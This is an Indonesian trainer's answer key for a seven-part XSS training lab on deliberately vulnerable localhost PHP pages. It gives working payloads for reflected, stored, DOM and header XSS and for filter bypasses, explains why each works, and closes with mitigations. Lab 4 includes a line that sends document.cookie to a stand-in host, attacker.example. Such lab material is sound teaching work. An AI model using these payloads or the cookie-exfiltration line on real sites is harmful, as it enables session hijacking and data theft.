# Kunci Jawaban — XSS Lab

> 📌 **Untuk trainer/pendamping.** Dokumen ini berisi payload final, langkah lengkap, dan
> penjelasan *kenapa* tiap payload berhasil untuk ke-7 lab di [README.md](README.md). Jangan
> dibagikan ke peserta sebelum sesi lab selesai.

---

## Lab 1 — Reflected XSS, HTML body (`lab1_reflected.php`)

**Sink:**
```php
Search results for: <?php echo $q; /* VULNERABLE: no htmlspecialchars() */ ?>
```
`$q` (parameter GET `q`) di-echo mentah ke dalam body HTML, tanpa encoding apa pun.

**Payload:**
```
http://localhost:8079/xss/lab1_reflected.php?q=<script>alert(document.domain)</script>
http://localhost:8079/xss/lab1_reflected.php?q=<img src=x onerror=alert(1)>
```
**Kenapa berhasil:** tidak ada `htmlspecialchars()`/encoding sama sekali, jadi tag yang
disisipkan langsung diparse browser sebagai elemen HTML aktif. Payload pertama jalan langsung
saat halaman dimuat; payload kedua memicu `onerror` karena `src=x` gagal dimuat sebagai gambar.

**Hasil:** popup `alert()` muncul menampilkan `document.domain`.

---

## Lab 2 — Reflected XSS, atribut HTML (`lab2_reflected_attribute.php`)

**Sink:**
```php
<input type="text" name="color" value="<?php echo $color; ?>">
```
`$color` disisipkan ke dalam atribut `value="..."` tanpa encoding.

**Payload 1 — keluar dari atribut lalu buka tag baru:**
```
?color="><script>alert(1)</script>
```
Hasil HTML yang terbentuk:
```html
<input type="text" name="color" value=""><script>alert(1)</script>">
```
`"` menutup atribut `value`, `>` menutup tag `<input>` lebih awal, lalu `<script>` baru
langsung tereksekusi.

**Payload 2 — tanpa tag baru, pakai event handler di atribut yang sama:**
```
?color=" onmouseover="alert(1)
```
Hasil: `<input type="text" name="color" value="" onmouseover="alert(1)">`. Submit form lalu
arahkan kursor ke kotak input untuk memicu `onmouseover`. Berguna untuk mendemonstrasikan
bypass filter yang hanya memblokir karakter `<`/`>`.

---

## Lab 3 — Reflected XSS, konteks JavaScript (`lab3_reflected_js.php`)

**Filter (tidak lengkap):**
```php
$name_js = str_replace('"', '\\"', $name);   // hanya escape karakter " saja
```

**Sink:**
```html
<script>
  var userName = "<?php echo $name_js; ?>";
</script>
```

**Payload 1 — keluar lewat parser HTML, bukan lewat JS (filter jadi tidak relevan):**
```
?name=</script><script>alert(1)</script>
```
**Kenapa berhasil:** browser mem-parsing tag `<script>...</script>` di level HTML *sebelum*
menjalankan isinya sebagai JS. Begitu parser HTML menemukan literal `</script>`, tag script
yang sedang berjalan langsung ditutup — filter `str_replace('"', ...)` tidak pernah menyentuh
string ini karena tidak mengandung karakter `"`.

**Payload 2 — "escape the escaper" pakai backslash:**
```
?name=\";alert(1);//
```
Jalannya: input mentah adalah `\";alert(1);//`. Filter mengganti setiap `"` menjadi `\"`,
sehingga `\"` (yang tadinya cuma 1 backslash + 1 quote) menjadi `\\"` (2 backslash + 1 quote).
Hasil akhir yang disisipkan ke `<script>`:
```html
<script>
  var userName = "\\";alert(1);//";
</script>
```
Secara sintaks JS, `"\\"` adalah string berisi satu karakter backslash literal yang **ditutup**
oleh `"` tersebut — statement `var userName = ...;` selesai di situ. `alert(1);` lalu
dieksekusi sebagai statement baru, dan `//` mengomentari sisa baris (`";`). Filter yang cuma
meng-escape `"` tanpa meng-escape `\` sendiri justru **membantu** attacker menetralkan quote
penutup miliknya.

---

## Lab 4 — Stored XSS, guestbook (`lab4_stored_comments.php`)

Komentar disimpan mentah (tanpa sanitasi) ke `data/comments.json`, lalu di-echo mentah lagi
saat ditampilkan — **dua** field rentan: `name` dan `comment`, keduanya tanpa
`htmlspecialchars()`.

**Payload (isi field "Comment" di form):**
```
<script>alert(document.cookie)</script>
```
atau untuk simulasi eksfiltrasi data nyata:
```
<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">
```
**Langkah:**
1. Isi nama bebas, isi komentar dengan salah satu payload di atas, submit.
2. Reload halaman (atau minta peserta lain membuka `lab4_stored_comments.php`) — payload
   tersimpan di `comments.json` dan dieksekusi ulang **untuk setiap pengunjung**, bukan cuma
   yang mengirim komentar. Ini yang membedakan stored dari reflected XSS.

**Poin diskusi:** bayangkan ini adalah dashboard admin yang membaca tiket/komentar dari user —
XSS tersimpan di sana bisa membajak sesi admin begitu tiket dibuka.

---

## Lab 5 — DOM-based XSS (`lab5_dom_xss.php`)

**Source & sink (murni client-side, JS berikut):**
```js
var hash = decodeURIComponent(location.hash.substring(1));
document.getElementById('output').innerHTML = 'You searched for: ' + hash;
```
`location.hash` (fragment URL setelah `#`) dibaca lalu ditulis langsung ke `innerHTML` tanpa
encoding — dipanggil ulang tiap event `hashchange` maupun saat page load.

**Payload:**
```
http://localhost:8079/xss/lab5_dom_xss.php#<img src=x onerror=alert(document.domain)>
```
**Poin diskusi penting:** fragment (`#...`) **tidak pernah dikirim ke server** — tidak akan
muncul di access log, WAF, atau proxy manapun yang memantau request. Ini kenapa DOM-based XSS
butuh analisis *source-to-sink* langsung pada kode JavaScript sisi klien, bukan cuma
memeriksa log/response server seperti pendekatan reflected/stored.

---

## Lab 6 — XSS + filter bypass (`lab6_filter_bypass.php`)

**Filter:**
```php
$filtered = str_replace('<script>', '', $input);   // case-sensitive, sekali pass, hanya 1 tag
```
Filter ini hanya menghapus substring persis `<script>` (huruf kecil semua), sekali jalan, dan
tidak menyentuh tag lain maupun atribut event handler.

**Empat bypass yang terbukti jalan terhadap filter ini:**

| Payload | Kenapa lolos |
|---|---|
| `<ScRiPt>alert(1)</ScRiPt>` | Filter *case-sensitive* — hanya mencocokkan `<script>` huruf kecil persis; browser tetap parse tag apa pun variasi huruf besar/kecilnya. |
| `<img src=x onerror=alert(1)>` | Tidak mengandung substring `<script>` sama sekali — filter tidak relevan. |
| `<svg onload=alert(1)>` | Sama seperti di atas — tag & event handler berbeda, tidak tersentuh filter. |
| `<scr<script>ipt>alert(1)</scr<script>ipt>` | Filter hanya jalan **1 kali** (bukan rekursif). Menghapus `<script>` yang ada **di tengah** justru menyatukan sisa fragmen `<scr` + `ipt>` menjadi `<script>` utuh kembali. Pola sama berlaku untuk tag penutup `</scr<script>ipt>` → `</script>`. |

**Hasil:** setelah difilter, payload ke-4 berubah menjadi `<script>alert(1)</script>` utuh dan
tereksekusi — contoh klasik kenapa blacklist string tunggal (non-rekursif) selalu bisa dilewati.

---

## Lab 7 — Reflected XSS lewat header (`lab7_useragent.php`)

**Sink:**
```php
User-Agent: <?php echo $ua; /* VULNERABLE: header reflected without htmlspecialchars() */ ?>
```
`$_SERVER['HTTP_USER_AGENT']` di-echo mentah — header ini tidak bisa diubah lewat navigasi
browser biasa, jadi butuh tool tambahan.

**Payload:**
```bash
curl -A "<script>alert(document.domain)</script>" http://localhost:8079/xss/lab7_useragent.php
```
Alternatif: ubah User-Agent lewat DevTools (Network conditions/Sensors) di browser lalu reload
halaman biasa.

**Poin diskusi:** reflected XSS tidak terbatas pada parameter URL — header HTTP apa pun yang
dikontrol attacker (User-Agent, Referer, X-Forwarded-For, dst.) dan di-echo tanpa encoding
adalah vektor yang sama validnya, misalnya kalau header tersebut pernah ditampilkan lagi di
halaman log/analytics admin.

---

## Ringkasan hasil akhir

| Lab | Konteks | Payload final |
|---|---|---|
| 1 | HTML body | `<script>alert(document.domain)</script>` |
| 2 | Atribut HTML | `"><script>alert(1)</script>` |
| 3 | String JS | `</script><script>alert(1)</script>` **atau** `\";alert(1);//` |
| 4 | Stored (guestbook) | `<script>alert(document.cookie)</script>` di field comment |
| 5 | DOM (`innerHTML`) | `#<img src=x onerror=alert(document.domain)>` |
| 6 | Filter bypass | `<svg onload=alert(1)>` (atau 3 varian lain di tabel atas) |
| 7 | Header `User-Agent` | `curl -A "<script>alert(document.domain)</script>" ...` |

## Mitigasi (ringkas, lihat [README.md](README.md) untuk versi lengkap)
- Contextual output encoding: `htmlspecialchars()` untuk HTML body & atribut, `json_encode()`
  untuk menyisipkan data ke JavaScript (bukan concatenation manual seperti Lab 3).
- Content-Security-Policy untuk membatasi eksekusi inline script.
- `HttpOnly` cookie flag agar `document.cookie` tidak terbaca lewat XSS (Lab 4).
- Untuk DOM-based (Lab 5): audit sink berbahaya (`innerHTML`, `document.write`, `eval`), pakai
  `textContent` atau sanitizer seperti DOMPurify.
- Filter blacklist (Lab 6) selalu bisa dilewati — pakai encoding kontekstual atau allowlist.
